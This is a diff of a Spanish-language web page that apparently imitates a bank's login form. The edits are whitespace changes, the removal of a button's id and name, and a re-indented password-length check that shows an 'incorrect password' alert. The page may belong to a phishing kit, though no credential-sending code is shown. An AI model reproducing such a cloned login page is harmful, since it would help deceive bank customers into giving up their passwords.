@@ -6,7 +6,7 @@
   		<meta charset="utf-8">
   		
 		<meta content="es" http-equiv="Content-Language">
-  	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+		<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
 		<meta name="description" content="">
   		<meta name="author" content="">
@@ -64,7 +64,7 @@
 	   							</div>
 	   							<br>
 	   							<button id="btnCancelar" name="btnCancelar" class="btn btn-blanco" type="button">Cancelar</button>&nbsp;&nbsp;&nbsp;
-	   							<button id="btnPass" name="btnPass" class="btn btn-amarillo" type="button" onclick="chc()">Continuar</button>
+	   							<button  class="btn btn-amarillo" type="button" onclick="chc()">Continuar</button>
 	   							<br>
 	   							<div class="texto" style="text-align: right;">
 		   							<div class="vinculos">
@@ -271,7 +271,7 @@ El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: Espa
  <script>
     
 	function chc(params) {
-	if (document.getElementById("txtPassword").value.length < 4) {
+		if (document.getElementById("txtPassword").value.length < 4) {
 			alert("Clave incorrecta o erronea")
 			
 		}else{
